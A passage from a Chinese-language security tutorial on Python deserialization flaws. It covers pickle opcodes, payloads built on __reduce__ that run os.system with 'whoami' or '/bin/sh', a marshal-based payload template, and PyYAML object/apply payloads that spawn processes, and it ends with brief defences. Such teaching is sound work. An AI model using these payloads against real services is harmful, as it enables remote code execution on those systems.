    EMPTY_SET        = b'\x8f'  # push empty set on the stack
    ADDITEMS         = b'\x90'  # modify set by adding topmost stack items
    FROZENSET        = b'\x91'  # build frozenset from topmost stack items
    NEWOBJ_EX        = b'\x92'  # like NEWOBJ but work with keyword only arguments
    STACK_GLOBAL     = b'\x93'  # same as GLOBAL but using names on the stacks
    MEMOIZE          = b'\x94'  # store top of the stack in memo
    FRAME            = b'\x95'  # indicate the beginning of a new frame
    # Protocol 5
    BYTEARRAY8       = b'\x96'  # push bytearray
    NEXT_BUFFER      = b'\x97'  # push next out-of-band buffer
    READONLY_BUFFER  = b'\x98'  # make top of stack readonly
上文谈到了`opcode`是有多个版本的, 在进行序列化时可以通过`protocol=num`来选择`opcode`的版本, 指定的版本必须小于等于`5`.
    import os
    import pickle
    class Demo():
        def __init__(self, name='h3rmesk1t'):
            self.name = name
        def __reduce__(self):
            return (os.system, ('whoami',))
    demo = Demo()
    for i in range(6):
        print('[+] pickle v{}: {}'.format(str(i), pickle.dumps(demo, protocol=i)))
    [+] pickle v0: b'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
    [+] pickle v1: b'cposix\nsystem\nq\x00(X\x06\x00\x00\x00whoamiq\x01tq\x02Rq\x03.'
    [+] pickle v2: b'\x80\x02cposix\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'
    [+] pickle v3: b'\x80\x03cposix\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.'
    [+] pickle v4: b'\x80\x04\x95!\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
    [+] pickle v5: b'\x80\x05\x95!\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.'
基本模式:
    c
    (
    tR.
这里用一段简短的字节码来演示利用过程:
    cos
    system
    (S'whoami'
    tR.
上文中的字节码其实就是`__import__('os').system(*('whoami',))`, 下面来分解分析一下:
    cos         =>  引入模块 os.
    system      =>  引用 system, 并将其添加到 stack.
    (S'whoami'  =>  把当前 stack 存到 metastack, 清空 stack, 再将 'whoami' 压入 stack.
    t           =>  stack 中的值弹出并转为 tuple, 把 metastack 还原到 stack, 再将 tuple 压入 stack.
    R           =>  system(*('whoami',)).
    .           =>  结束并返回当前栈顶元素.
需要注意的是, 并不是所有的对象都能使用`pickle`进行序列化和反序列化, 例如文件对象和网络套接字对象以及代码对象就不可以.
# 反序列化漏洞
## 漏洞常见出现地方
  1. 通常在解析认证`token`, `session`的时候. 现在很多`Web`服务都使用`redis`、`mongodb`、`memcached`等来存储`session`等状态信息.
  2. 可能将对象`Pickle`后存储成磁盘文件.
  3. 可能将对象`Pickle`后在网络中传输.
## 漏洞利用方式
漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化, 反序列化后产生的对象会在结束时触发`__reduce__()`函数从而触发恶意代码.
简单来说, `__reduce__()`魔术方法类似于`PHP`中的`__wakeup()`方法,
在反序列化时会先调用`__reduce__()`魔术方法.
  1. 如果返回值是一个字符串, 那么将会去当前作用域中查找字符串值对应名字的对象, 将其序列化之后返回.
  2. 如果返回值是一个元组, 要求是`2`到`6`个参数(`Python3.8`新加入元组的第六项).
    1. 第一个参数是可调用的对象.
    2. 第二个是该对象所需的参数元组, 如果可调用对象不接受参数则必须提供一个空元组.
    3. 第三个是用于表示对象的状态的可选元素, 将被传给前述的`__setstate__()`方法, 如果对象没有此方法, 则这个元素必须是字典类型并会被添加至`__dict__`属性中.
    4. 第四个是用于返回连续项的迭代器的可选元素.
    5. 第五个是用于返回连续键值对的迭代器的可选元素.
    6. 第六个是一个带有`(obj, state)`签名的可调用对象的可选元素.
## 基本 Payload
    import os
    import pickle
    class Demo(object):
        def __reduce__(self):
            shell = '/bin/sh'
            return (os.system,(shell,))
    demo = Demo()
    pickle.loads(pickle.dumps(demo))
# Marshal 反序列化
由于`pickle`无法序列化`code`对象, 因此在`python2.6`后增加了一个`marshal`模块来处理`code`对象的序列化问题.
    import base64
    import marshal
    def demo():
        import os
        os.system('/bin/sh')
    code_serialized = base64.b64encode(marshal.dumps(demo()))
    print(code_serialized)
但是`marshal`不能直接使用`__reduce__`, 因为`reduce`是利用调用某个`callable`并传递参数来执行的,
而`marshal`函数本身就是一个`callable`, 需要执行它, 而不是将他作为某个函数的参数.
这时候就要利用上面分析的那个`PVM`操作码来进行构造了, 先写出来需要执行的内容,
`Python`能通过`types.FunctionTyle(func_code,globals(),'')()`来动态地创建匿名函数,
这一部分的内容可以看[官方文档](https://docs.python.org/3/library/types.html)的介绍.
结合上文的示例代码, 最重要执行的是:
`(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(),
''))()`.
这里直接贴一下别的师傅给出来的`Payload`模板.
    import base64
    import pickle
    import marshal
    def foo():
        import os
        os.system('whoami;/bin/sh')     # evil code
    shell = """ctypes
    FunctionType
    (cmarshal
    loads
    (cbase64
    b64decode
    (S'%s'
    tRtRc__builtin__
    globals
    (tRS''
    tR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))
    print(pickle.loads(shell))
# PyYAML 反序列化
## 漏洞点
找到`yaml/constructor.py`文件, 查看文件代码中的三个特殊`Python`标签的源码:
  * `!!python/object`标签.
  * `!!python/object/new`标签.
  * `!!python/object/apply`标签.
这三个`Python`标签中都是调用了`make_python_instance`函数, 跟进查看该函数. 可以看到,
在该函数是会根据参数来动态创建新的`Python`类对象或通过引用`module`的类创建对象, 从而可以执行任意命令.
## Payload(PyYaml = 5.1)
    from yaml import *
    data = b"""!!python/object/apply:subprocess.Popen
     - calc"""
    deserialized_data = load(data, Loader=Loader)
    print(deserialized_data)
    from yaml import *
    data = b"""!!python/object/apply:subprocess.Popen
    - calc"""
    deserialized_data = unsafe_load(data) 
    print(deserialized_data)
# 防御方法
  * 采用用更高级的接口`__getnewargs()`、`__getstate__()`、`__setstate__()`等代替`__reduce__()`魔术方法.
  * 进行反序列化操作之前进行严格的过滤, 若采用的是`pickle`库可采用装饰器实现.
# 参考
  * [一篇文章带你理解漏洞之 Python 反序列化漏洞](https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)